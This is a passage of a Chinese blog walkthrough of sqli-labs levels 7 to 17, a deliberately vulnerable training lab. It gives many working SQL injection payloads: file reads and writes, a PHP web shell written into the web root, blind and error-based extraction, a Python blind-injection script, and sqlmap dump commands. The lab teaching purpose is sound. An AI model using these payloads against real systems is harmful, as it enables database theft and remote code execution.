+<p>A.必须有权限读取并且文件可读<code>and (select count(\*) from mysql.user)&gt;0\* </code>如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。<br>B.欲读取文件必须在服务器上。<br>C.必须指定文件完整的路径<br>D.欲读取文件必须小于max_allowed_packet</p>
+</blockquote>
+<p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：</p>
+<blockquote>
+<p>1.绝对物理路径<br>2.构造有效的畸形语句(报错爆出绝对路径)</p>
+</blockquote>
+<p>实例：<br><code>select 1,2,3,4,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</code>利用hex()将文件导出来，特别是smb文件<br><code>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</code><br>注意：c:/boot.ini的十六进制是0x633s2f626f6f742e696e69<br><code>-1 union select 1,1,1,load_file(C:\\boot.ini)</code><br>注意：路径里的/用\代替</p>
+<p><code>SELECT INTO OUTFILE &#39;file_name&#39;</code>,导入到文件中，具体参阅其他文章。file_name 不能是一个已经存在的文件。</p>
+<hr>
+<p><code>?id=1</code>和<code>?id=1&quot;</code>正常，<code>?id=1&#39;</code>报错：字符型注入<br><strong>注意</strong></p>
+<blockquote>
+<p>这里要强调一下，一般在Sql查询语句中，单双引号不能同时存在。即数字型/字符型及单/双引号注入能在这三条语句返回的结果判断出来。</p>
+</blockquote>
+<p>分析是否存在括号及个数：<code>?id=1&#39; and 1=1--+</code><br>报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure>
+<p>说明有括号存在，依次增加括号个数，直到回显正常</p>
+<blockquote>
+<p>?id=1’)) and 1=1–+</p>
+</blockquote>
+<p><strong>注意</strong></p>
+<blockquote>
+<p>一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数(存在注入点)。</p>
+</blockquote>
+<p>尝试导出文件<br><code>?id=1&#39;)) union select * from users into outfile &quot;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7&quot;--+</code></p>
+<p>发现无论怎么弄，但是一直报错，而且该路径下也没有出现文件</p>
+<p><strong>可能原因1：</strong><br>权限不够，需要root权限才能对数据库进行读写操作。<br><code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code><br>回显正常，说明不是权限问题。</p>
+<p><strong>可能原因2：</strong><br>mysql数据库中secure_file_priv的参数问题<br> 查看官方文档，secure_file_priv参数用于限制LOAD DATA, SELECT …OUTFILE, LOAD_FILE()传到哪个指定目录。</p>
+<blockquote>
+<p>1.secure_file_priv为NULL时，表示限制mysqld不允许导入或导出。<br>2.secure_file_priv为/tmp时,表示限制mysqld只能在/tmp目录中执行导入导出其他目录不能执行。<br>3.secure_file_priv没有值时，表示不限制mysqld在任意目录的导入导出。</p>
+</blockquote>
+<p>输入<code>show variables like &#39;%secure%&#39;</code>,查看secure_file_priv 的值，发现为NULL，表示限制不能导入导出<br><img src="https://s2.ax1x.com/2019/03/05/kjiIJI.png" alt="kjiIJI.png"></p>
+<p>如果想要往任意路径下导入导出，那么需要把secure_file_priv的值设成空。<br>找到mysql目录下的<strong>my.ini</strong>或者<strong>my.cnf</strong>文件，写入这句话</p>
+<blockquote>
+<p>secure_file_priv=’’</p>
+</blockquote>
+<p>重启mysql服务器，再次进行查询，secure_file_priv值为空了<br><img src="https://s2.ax1x.com/2019/03/05/kjFWcV.png" alt="kjFWcV.png"></p>
+<p>再次导出文件</p>
+<blockquote>
+<p>?id=1’)) union select 1,2,’<?php eval($\_POST[ee]); ?>‘ into outfile ‘F:\phpstudy\PHPTutorial\WWW\sqlilabs\Less-7\1.php’–+</p>
+</blockquote>
+<p>依然有报错<br><img src="https://s2.ax1x.com/2019/03/05/kjksKK.png" alt="kjksKK.png"><br>但是该路径下已经有导出的文件了<br><img src="https://s2.ax1x.com/2019/03/05/kjkBgx.png" alt="kjkBgx.png"><br><img src="https://s2.ax1x.com/2019/03/05/kjkXPs.png" alt="kjkXPs.png"></p>
+<p>然后菜刀连接<br><img src="https://s2.ax1x.com/2019/03/05/kjAUL8.png" alt="kjAUL8.png"></p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>查看源码，发现对报错信息进行了注释，不能进行报错注入，只能盲注。<br>盲注payload：<code>?id=1%27and%20if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code>  第一个字符<br><code>?id=1&#39; and if(ascii(substr(database(),2,1))=101,1,sleep(5))--+</code>   第二个字符<br>以此类推。</p>
+<p>盲注脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;&#x27;&#x27;http://192.168.100.102/sqlilabs/Less-8/?id=1&#x27; and ascii(substr((select database()),&#123;_&#125;,1))</span><br><span class="line">&gt;&#123;__&#125; %23&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">database = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1,9):</span><br><span class="line">    max = 127</span><br><span class="line">    min = 65</span><br><span class="line">    while abs(max-min)&gt;1:</span><br><span class="line">    	mid = (max+min)//2</span><br><span class="line">    	payload = url.format(_=i,__=mid)</span><br><span class="line">    	ans = requests.get(payload)</span><br><span class="line">    	if &#x27;You are in...........&#x27; in ans.content:</span><br><span class="line">    		min = mid</span><br><span class="line">    	else:</span><br><span class="line">    		max = mid</span><br><span class="line">    database = database + chr(max)</span><br><span class="line">    print database</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>Less8中，输入合法时会返回正常页面“You are in”，而非法输入时没有返回任何东西。于是可以根据这个特点跑盲注，通过不同的返回页面来判断匹配的字符是否正确。<br>而在Less9中，合法输入与非法输入返回为同一个固定字符串。这样就不能根据页面的回显来判断匹配结果，要使用延时函数sleep()对两种输入进行区分。</p>
+<p>这一关是单引号闭合。<code>?id=1&#39;</code></p>
+<p><strong>爆库</strong><br><code>?id=1&#39;and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></p>
+<p><strong>爆表</strong><br><code>?id=1&#39;and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101,1,sleep(5))--+</code></p>
+<p><strong>爆列</strong><br><code>?id=1&#39;and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),1,1))=105,1,sleep(5))--+</code></p>
+<p><strong>爆内容</strong><br><code>?id=1&#39;and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+</code></p>
+<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>是双引号闭合<code>?id=1&quot;</code><br><code>?id=1&quot; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></p>
+<h2 id="Less-11-to-Less-20"><a href="#Less-11-to-Less-20" class="headerlink" title="Less-11 to Less-20"></a>Less-11 to Less-20</h2><hr>
+<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>这一关开始POST部分了,为了方便查看，使用burpsuite。</p>
+<p>可以使用<strong>sqlmap</strong></p>
+<p>bp抓包后，copy  to file,放在sqlmap目录下，</p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kvYjCn.png" alt="kvYjCn.png"></p>
+<p>命令如下：</p>
+<p><code>python sqlmap.py  -r 11.txt</code></p>
+<p>爆库：<code>python sqlmap.py -r 11.txt --dbs</code></p>
+<p>爆表：<code>python sqlmap.py -r 11.txt -D 数据库名 --tables</code></p>
+<p>爆列：<code>python sqlmap.py -r 11.txt -D 数据库名 -T 表名 --columns</code></p>
+<p>爆内容：<code>python sqlmap.py -r 11.txt -D 数据库名 -T 表名 -C 列名 --dump</code> </p>
+<p>按步骤来就可以。</p>
+<p>下面是<strong>手工注入</strong></p>
+<p>测试一下，输入username=1   password=1 抓包<br>在burpsuite中提交参数</p>
+<p>发现<code>uname=1&amp;passwd=1&#39;</code>报错<br><img src="https://s2.ax1x.com/2019/03/05/kj1dm9.png" alt="kj1dm9.png"><br><code>uname=1&amp;passd=1</code>和<code>uname=1&amp;passwd=1&quot;</code>不报错<br>可见是单引号闭合</p>
+<p>构造永真条件测试注入点：<br><code>uname=1&amp;passwd=1&#39; or 1=1--+</code><br><img src="https://s2.ax1x.com/2019/03/05/kj1DFx.png" alt="kj1DFx.png"></p>
+<p>因limit0,1返回了表中第一条的信息：Dumb,Dumb，即这里存在注入点，<br><code>or&#39;1&#39;=&#39;1&#39;</code>是一个永真条件（也可以用其他永真条件替代），使查询语句相当于select username,password from users where true即select username,password from users，返回所有结果。</p>
+<p>利用order by判断字段数<br><code>uname=1&amp;passwd=1%27 order by 2--+</code>不报错<br><code>uname=1&amp;passwd=1%27 order by 2--+</code>报错，说明有两个字段<br><img src="https://s2.ax1x.com/2019/03/05/kj16SO.png" alt="kj16SO.png"></p>
+<p>利用union语句联合查询：得到用户名和数据库名<br><strong>爆库</strong><br><code>uname=1&amp;passwd=-1&#39; union select database(),user()--+</code><br><img src="https://s2.ax1x.com/2019/03/05/kj1off.png" alt="kj1off.png"></p>
+<p><strong>爆表</strong><br><code>uname=1&amp;passwd=1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="https://s2.ax1x.com/2019/03/05/kj3iX4.png" alt="kj3iX4.png"></p>
+<p><strong>爆列名</strong><br><code>uname=1&amp;passwd=1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code><br><img src="https://s2.ax1x.com/2019/03/05/kj3WgU.png" alt="kj3WgU.png"></p>
+<p><strong>爆内容</strong><br><code>uname=1&amp;passwd=1&#39; union select group_concat(username),group_concat(password) from users--+</code><br><img src="https://s2.ax1x.com/2019/03/05/kj83xU.png" alt="kj83xU.png"></p>
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p><code>uname=1&amp;passwd=1&quot;)</code>报错，可见是双引号+括号闭合</p>
+<p>其他操作就和Less-11一样。</p>
+<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p><code>uname=1&amp;passwd=1</code>和<code>uname=1&amp;passwd=1&quot;</code>不报错<br><code>uname=1&amp;passwd=1&#39;</code>报错,缺少一个括号<br><img src="https://s2.ax1x.com/2019/03/05/kj8qds.png" alt="kj8qds.png"></p>
+<p><code>uname=1&amp;passwd=1&#39;)--+</code>闭合</p>
+<p><code>uname=1&amp;passwd=1&#39;) union select database(),user()--+</code>居然无回显，看来是想错了</p>
+<p>这题和上面的几道不一样，而是和Less-5差不多</p>
+<p>尝试一个报错注入payload,成功爆库</p>
+<p><code>uname=1&amp;passwd=1&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
+<blockquote>
+<p><img src="https://s2.ax1x.com/2019/03/05/kjGclT.png" alt="kjGclT.png"></p>
+</blockquote>
+<p>也可以双查询注入</p>
+<p><code>uname=1&amp;passwd=1&#39;) union select count(*),concat_ws(&#39;-&#39;,(select user()),(select database()),floor(rand()*2)) as a from information_schema.tables group by a--+</code></p>
+<p><strong>注意：如果上面的语句没有反应的话，先进行url编码试试看</strong></p>
+<p>很奇怪，有时可以回显，有时不能回显。</p>
+<p>报错注入比较好使。</p>
+<p><strong>爆库</strong></p>
+<p><img src="https://s2.ax1x.com/2019/03/05/kjJSht.png" alt="kjJSht.png"></p>
+<p>得到库名和用户名</p>
+<p><strong>爆表</strong></p>
+<p><code>uname=1&amp;passwd=1&#39;) union select count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2)) as a from information_schema.tables group by a--+</code></p>
+<p><strong>爆字段</strong></p>
+<p><code>uname=1&amp;passwd=1&#39;) union select count(*),concat_ws(&#39;-&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),floor(rand()*2)) as a from information_schema.tables group by a--+</code></p>
+<p><strong>爆内容</strong></p>
+<p><code>uname=1&amp;passwd=1&#39;) union select count(*),concat_ws(&#39;-&#39;,(select concat_ws(&#39;-&#39;,id,username,password) from users limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a--+</code></p>
+<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>是双引号闭合，其他和上面一样。</p>
+<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>其实从前面几关开始，正确回显，是显示这张照片</p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kvZXVK.png" alt="kvZXVK.png"></p>
+<p>错误回显，是显示这张照片。</p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kveFqP.png" alt="kveFqP.png"></p>
+<p>挨个测试这些</p>
+<blockquote>
+<p>uname=1&amp;passwd=1 or 1=1–+<br>uname=1&amp;passwd=1’ or 1=1–+<br>uname=1&amp;passwd=1” or 1=1–+<br>uname=1&amp;passwd=1’) or 1=1–+<br>uname=1&amp;passwd=1”) or 1=1–+</p>
+</blockquote>
+<p>经过测试，<code>uname=1&#39; or 1=1#$passwd=1</code>回显正确，<code>uname=1 or 1=1#$passwd=1</code>和<code>uname=1&quot; or 1=1#$passwd=1</code>是不能正确回显的。</p>
+<p>所以是bool型单引号闭合盲注，然后就是盲注的套路。</p>
+<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>转自简书<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b9ceed993ad4">Hyafinthus</a></p>
+<p>这两关的后台php文件其实是一样的，只是为了练习两种盲注方式。</p>
+<h4 id="注入方式与回显对比"><a href="#注入方式与回显对比" class="headerlink" title="注入方式与回显对比"></a>注入方式与回显对比</h4><p><strong>GET</strong></p>
+<table>
+<thead>
+<tr>
+<th>Less</th>
+<th>注入方法</th>
+<th>正确回显</th>
+<th>错误回显</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>基于错误注入</td>
+<td>查询到的用户名和密码</td>
+<td>Mysql错误信息</td>
+</tr>
+<tr>
+<td>5</td>
+<td>双注入</td>
+<td>固定字符串</td>
+<td>Mysql错误信息</td>
+</tr>
+<tr>
+<td>7</td>
+<td>导出文件注入</td>
+<td>固定字符串</td>
+<td>另一固定字符串</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Bool型盲注</td>
+<td>固定字符串</td>
+<td>无</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Time型盲注</td>
+<td>固定字符串</td>
+<td>同一固定字符串</td>
+</tr>
+</tbody></table>
+<p><strong>POST</strong></p>
+<table>
+<thead>
+<tr>
+<th>Less</th>
+<th>注入方法</th>
+<th>成功回显</th>
+<th>失败回显</th>
+<th>错误回显</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>11</td>
+<td>基于错误注入</td>
+<td>用户名和密码 (flag.jpg)</td>
+<td>无 (slap.jpg)</td>
+<td>Mysql错误信息 (slap.jpg)</td>
+</tr>
+<tr>
+<td>13</td>
+<td>双注入</td>
+<td>无 (flag.jpg)</td>
+<td>无 (slap.jpg)</td>
+<td>Mysql错误信息 (slap.jpg)</td>
+</tr>
+<tr>
+<td>15</td>
+<td>Bool/Time型盲注</td>
+<td>无 (flag.jpg)</td>
+<td>无 (slap.jpg)</td>
+<td>无 (slap.jpg)</td>
+</tr>
+</tbody></table>
+<p><strong>注意：</strong>GET和POST差别在于，GET只需要提交参数<code>id</code>，而POST则需要<code>username</code>与<code>password</code>都正确。</p>
+<h4 id="分析查询语句"><a href="#分析查询语句" class="headerlink" title="分析查询语句"></a>分析查询语句</h4><p>不像GET中若出现错误回显必是Mysql语法错误（提交时使<code>id</code>存在），POST若不返回Mysql错误信息，光凭一个<code>登录失败</code>是分不清是用户名和密码不正确还是出现了Mysql语法错误。</p>
+<p>所以我们就需要在POST时构造永真条件使返回忽略用户名和密码不正确这种情况。若将查询语句闭合则会显示<code>登陆成功</code>，则可以依次增加小括号个数分析查询语句：</p>
+<blockquote>
+<p>uname=1&amp;passwd=1 or 1=1–+<br>uname=1&amp;passwd=1’ or 1=1–+<br>uname=1&amp;passwd=1” or 1=1–+<br>uname=1&amp;passwd=1’) or 1=1–+<br>uname=1&amp;passwd=1”) or 1=1–+</p>
+</blockquote>
+<p>经测试是time型双引号加小括号的盲注。试了一下bool也行。</p>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>这个不知道怎么写，在网上查了好多，才看明白点。</p>
+<blockquote>
+<p>作者：Hyafinthus</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/62d394c38230">https://www.jianshu.com/p/62d394c38230</a></p>
+</blockquote>
+<p>如果想看详细的请看一下这位博主的文章sqlilabs的题解，非常的详细。<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/62d394c38230">Hyafinthus</a>，我也是参考他的文章学的。</p>
+<p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span></span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		mysql_query(<span class="variable">$update</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>check_input()</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>几个PHP函数</strong></p>
+<p><strong>substr</strong>()函数</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string,start[,length])</span><br></pre></td></tr></table></figure>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string</td>
+<td>必需，规定要返回其中一部分的字符串</td>
+</tr>
+<tr>
+<td>start</td>
+<td>必需，规定在字符串的何处开始</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>正数</strong>：在字符串的指定位置开始</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>负数</strong>：在从字符串结尾开始的指定位置开始</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>0</strong>：在字符串中的第一个字符处开始</td>
+</tr>
+<tr>
+<td>length</td>
+<td>可选，要返回的字符数。如果省略，则返回剩余文本</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>正数</strong>：从start参数所在的位置返回的长度</td>
+</tr>
+<tr>
+<td></td>
+<td><strong>负数</strong>：从字符串末端返回的长度</td>
+</tr>
+</tbody></table>
+<p><strong>get_magic_quotes_gpc</strong>()函数</p>
+<p><code>get_magic_quotes_gpc()</code>函数取得PHP环境配置的变量<code>magic_quotes_gpc(GPC, Get/Post/Cookie)</code>值。返回<code>0</code>表示本功能关闭，返回<code>1</code>表示本功能打开。</p>
+<p>当<code>magic_quotes_gpc</code>打开时，所有的<code>&#39;(单引号)</code>、<code>&quot;(双引号)</code>、<code>\(反斜杠)</code>和<code>NULL(空字符)</code>会自动转为含有反斜杠的溢出字符。</p>
+<p><strong>addslashes</strong>()与<strong>stripslashes</strong>()函数</p>
+<p><code>addslashes(string)</code>函数返回在预定义字符之前添加<strong>反斜杠</strong><code>\</code>的字符串：</p>
+<p>单引号 <code>&#39;</code> ，双引号 <code>&quot;</code> ，反斜杠 <code>\</code> ，空字符 <code>NULL</code> </p>
+<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
+<blockquote>
+<p><strong>注意：</strong>默认地，PHP对所有的GET、POST和COOKIE数据自动运行<code>addslashes()</code>。所以不应对已转义过的字符串使用<code>addslashes()</code>，因为这样会导致双层转义。遇到这种情况时可以使用函数<code>get_magic_quotes_gpc()</code>进行检测。</p>
+</blockquote>
+<p>`</p>
+<p>stripslashes(string)<code>函数删除由</code>addslashes()`函数添加的反斜杠。</p>
+<p><strong>ctype_digit</strong>()函数</p>
+<p><code>ctype_digit(string)</code>函数检查字符串中每个字符是否都是十进制数字，若是则返回<code>TRUE</code>，否则返回<code>FALSE</code>。</p>
+<p><strong>mysql_real_escape_string</strong>()函数</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string(string,connection)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string</td>
+<td>必需，规定要转义的字符串</td>
+</tr>
+<tr>
+<td>connection</td>
+<td>可选，规定MySQL连接。如果未规定，则使用上一个连接</td>
+</tr>
+</tbody></table>
+<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p>
+<p><code>\x00</code>,<code>\n</code>,<code>\r</code>,<code>\</code>,<code>&#39;</code>,<code>&quot;</code>,<code>\x1a</code></p>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回<code>FALSE</code>。</p>
+<blockquote>
+<p>本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于<code>mysql_query()</code>，可使用本函数来预防数据库攻击。</p>
+</blockquote>
+<p><strong>intval</strong>()函数</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval(var[,base])</span><br></pre></td></tr></table></figure>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>var</td>
+<td>要转换成integer的数量值</td>
+</tr>
+<tr>
+<td>base</td>
+<td>转化所使用的进制</td>
+</tr>
+</tbody></table>
+<p><code>intval()</code>函数获取变量的整数值。通过使用指定的进制<code>base</code>转换（默认是十进制），返回变量<code>var</code>的<code>integer</code>数值。<code>intval()</code>不能用于<code>object</code>，否则会产生<code>E_NOTICE</code>错误并返回<code>1</code>。</p>
+<p>成功时返回<code>var</code>的<code>integer</code>值，失败时返回<code>0</code>。空的<code>array</code>返回<code>0</code>，非空的<code>array</code>返回<code>1</code>，最大的值取决于操作系统。</p>
+<blockquote>
+<p>如果<code>base</code>是<code>0</code>，通过检测<code>var</code>的格式来决定使用的进制：</p>
+<ul>
+<li>如果字符串包括了<code>0x</code>或<code>0X</code>的前缀，使用16进制<code>hex</code>；否则，</li>
+<li>如果字符串以<code>0</code>开始，使用8进制<code>octal</code>；否则，</li>
+<li>使用10进制<code>decimal</code>。</li>
+</ul>
+</blockquote>
+<p><strong>有参数检查与过滤</strong></p>
+<p><strong>注意：</strong>在用<code>uanme</code>查询之前，它用<code>check_input()</code>函数做了检查。</p>
+<blockquote>
+<p><strong>1</strong>. 若<code>uname</code>非空，截取它的前15个字符。<br> <strong>2</strong>. 若php环境变量<code>magic_quotes_gpc</code>打开，去除转义的反斜杠<code>\</code>。<br> <strong>3</strong>. 若<code>uname</code>字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。</p>
+</blockquote>
+<p>所以我们几乎不可能在<code>uname</code>处注入，唯一的注入点在<code>passwd</code>处。</p>
+<p><strong>子查询注入</strong></p>
+<blockquote>
+<p>当在一个聚合函数如<code>count()</code>函数后面，如果使用分组语句如<code>group by</code>就会把查询的一部分以错误的形式显示出来。</p>
+</blockquote>
+<p><strong>选择哪种方式</strong></p>
+<p>子查询注入在Less-5中即双注入，对于<code>update</code>、<code>delete</code>和<code>insert</code>通常都用结合<code>or</code>的逻辑判断。</p>
+<blockquote>
+<p>在后台是<code>select</code>语句时我们能通过<code>union</code>联合查询<strong>CONCAT子查询</strong>（即Less5使用的双注入）获得错误信息中的数据。<br> 而这里的后台是<code>update</code>（<code>delete</code>/<code>insert</code>）语句，我们只能通过<code>or</code>逻辑判断<strong>派生表</strong>（在Less5中提到一句）来获得错误信息中的数据。</p>
+</blockquote>
+<p>注意：**上面这段是根据实际情况推断出的，但没有触及原理，也不完全正确。经过对比Less5的两种子查询和查找资料，得到了正确的结论。</p>
+<p>使用<strong>CONCAT子查询</strong>时，错误信息提示子查询中应该只包含一个字段。</p>
